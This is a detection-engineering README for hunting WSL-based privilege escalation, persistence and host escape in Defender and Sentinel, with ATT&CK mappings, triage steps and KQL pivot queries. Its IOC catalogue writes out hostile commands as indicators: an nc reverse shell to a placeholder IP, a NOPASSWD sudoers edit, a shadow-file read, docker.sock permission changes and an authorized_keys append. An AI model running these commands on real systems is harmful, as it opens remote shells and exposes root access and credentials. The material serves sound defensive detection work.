# WSL Privilege Escalation & Persistence Detection  
Author: **Ala Dabat**  
Category: **Privilege Escalation / Persistence / Host Escape**  
Platform: **Microsoft Defender for Endpoint / Microsoft Sentinel**  
Version: **Core Hunt Pack – Behaviour-Driven Analytic**

This document provides a complete technical reference for the WSL PrivEsc & Persistence detection analytic, including MITRE ATT&CK mappings, behaviour surfaces, IOC catalogue, threat detection matrices, triage steps, and IR-ready pivot tables.

The purpose of this hunt is to identify **any adversarial use of Windows Subsystem for Linux (WSL)** for privilege escalation, credential access, persistence, reverse shells, or Windows host boundary escape.

---

# 1. Overview

WSL introduces a Linux execution boundary inside Windows. Attackers increasingly use WSL because:

- It can run Linux binaries unnoticed by traditional Windows-focused tooling  
- It provides a direct pathway to modify the Windows filesystem  
- It enables root-level interactive shells  
- It allows modification of Linux credential stores (/etc/shadow, /etc/sudoers)  
- It supports covert persistence mechanisms (SSH keys, cron jobs)  
- It is often launched by LOLBins to bypass application control  
- It can interact with docker.sock for container escape → full host compromise  

This analytic focuses on **behaviour**, not signatures, making it resilient to variant, renamed, or obfuscated WSL chains.

---

# 2. MITRE ATT&CK Mapping

| Technique | ID | Relevance |
|----------|----|-----------|
| Command & Scripting Interpreter (WSL) | T1059.004 | Execution of wsl.exe, bash.exe, wslhost.exe |
| Linux Privilege Escalation | T1548 | Root elevation flags, sudoers modification |
| Credential Access (Linux Shadow File) | T1003 | Reads/writes to /etc/shadow or /etc/passwd |
| Exploit Container / Boundary Escape | T1611 | Writes/mounts targeting Windows paths or docker.sock |
| Persistence (SSH Authorized Keys) | T1098.004 | Creation/alteration of ~/.ssh/authorized_keys |
| Masquerading / LOLBin Abuse | T1036 | mshta, rundll32, wscript launching WSL |
| Ingress Tool Transfer | T1105 | Reverse shell / external payload fetch via curl/wget/python |
| Account Manipulation | T1098 | Privilege modification inside Linux VM |
| Execution | T1204 | User/attacker-initiated WSL subsystem execution |

---

# 3. Threat Detection Matrix

| Behaviour Category | Detected | Notes |
|--------------------|----------|-------|
| WSL launched with root/system flags | YES | --system, -u root, debug shells |
| WSL launched by LOLBins | YES | mshta, wscript, rundll32 |
| Linux reverse shells (nc, python, curl) | YES | Regex patterns validated |
| Host escape via mount of Windows paths | YES | /mnt/c/Windows, mount operations |
| Modification of /etc/shadow | YES | Direct read/write detection |
| Modification of /etc/sudoers | YES | Identified via keyword + file action |
| SSH key persistence | YES | Writes to ~/.ssh/authorized_keys |
| docker.sock abuse | YES | Critical for container escape |
| Benign developer WSL use | NO | Scoring excludes low-risk patterns |
| Simple interactive WSL shells | NO | Prevent false alerts |

---

# 4. Behavioural Logic Model

## 4.1 Suspicious WSL Execution
Flagged when WSL binaries appear with:

- Root elevation flags (`--system`, `--user root`, `--debug-shell`)  
- Privileged file access (`/etc/shadow`, `/etc/sudoers`)  
- Reverse shell command patterns  
- Mount operations referencing Windows host paths  
- Abnormal parents (mshta.exe, wscript.exe, rundll32.exe, installutil.exe)

## 4.2 Critical Path Interaction
Direct file access or modification of:

- `/etc/shadow` → credential access  
- `/etc/sudoers` → privilege escalation  
- `/root/.ssh/authorized_keys` → persistence  
- `/var/run/docker.sock` → container escape and lateral movement  

## 4.3 Scoring + Kill Chain Assignment
Events are scored by:

- **Risk of privilege escalation**
- **Risk to credential stores**
- **Use of LOLBins as parents**
- **Reverse shell indicators**
- **Host boundary access**

Kill chain stages include:

- Execution  
- Privilege Escalation  
- Persistence  
- Credential Access  
- Lateral Movement  
- Impact  

---

# 5. IOC Catalogue

| IOC Type | Indicator Example |
|----------|-------------------|
| Root Flag | `wsl.exe --system` |
| sudoers Edit | `echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` |
| Reverse Shell | `bash -c "nc 10.10.10.10 4444 -e /bin/bash"` |
| Credential Access | `cat /etc/shadow` |
| SSH Persistence | `>> /root/.ssh/authorized_keys` |
| docker.sock Abuse | `chmod 777 /var/run/docker.sock` |
| Host Escape Attempt | `--mount /mnt/c/Windows/System32` |
| LOLBin Parent | `mshta.exe -> wsl.exe` |

---

# 6. Kill Chain Alignment

| Phase | Example Behaviour | Detection Surface |
|-------|------------------|-------------------|
| Initial Access | LOLBins launching WSL | Parent-child validation |
| Execution | Linux payload execution | WSL process telemetry |
| Privilege Escalation | sudoers/shadow manipulation | File event analysis |
| Persistence | SSH authorized key changes | File write activity |
| Credential Access | shadow/passwd extraction | Path + command-line |
| Lateral Movement | docker.sock exploitation | Host boundary events |
| Impact | Full host takeover | Mount operations |

---

# 7. IR Pivot Table (SOC Analyst Quick Reference)

| Objective | Pivot Query (Sentinel/MDE) |
|-----------|----------------------------|
| Find all WSL parents | `DeviceProcessEvents | where FileName =~ "wsl.exe" | summarize by InitiatingProcessFileName` |
| Check credential file reads | `DeviceFileEvents | where FolderPath has "/etc/shadow"` |
| Identify reverse shells | `DeviceProcessEvents | where ProcessCommandLine matches regex "nc .* -e"` |
| Identify host escape | `DeviceProcessEvents | where ProcessCommandLine has "/mnt/c/Windows"` |
| SSH persistence | `DeviceFileEvents | where FileName =~ "authorized_keys"` |
| docker.sock misuse | `DeviceFileEvents | where FolderPath has "docker.sock"` |
| Cross-host blast radius | `DeviceProcessEvents | where ProcessCommandLine has_any("wsl","bash") | summarize count() by DeviceName` |

---

# 8. Analyst Workflow & Response Guide

### Step 1 — Validate Parent Process  
- Normal shell? Low suspicion.  
- LOLBin parent? High suspicion → escalate immediately.

### Step 2 — Inspect Command Line  
Look for root flags, Windows path access, reverse shell patterns.

### Step 3 — Validate File Events  
Any modification of `/etc/shadow`, `/etc/sudoers`, or `authorized_keys` = critical.

### Step 4 — Determine Intent  
- Escalation  
- Persistence  
- Exfiltration  
- Host escape  
- Docker/container misuse

### Step 5 — Assess Blast Radius  
Check for similar events across fleet.

### Step 6 — Containment Actions  
- Isolate host  
- Reset credentials  
- Review scheduled tasks  
- Validate Docker/container integrity  
- Lock down WSL usage policy if necessary  

---

# 9. Detection Engineering Notes

- WSL acts as an “EDR blind spot” for many orgs.  
- Behavioural signals are strong and stable across variants.  
- High-risk parents launching WSL are often part of loader chains.  
- Host escape attempts require immediate escalation.

---

# End of README
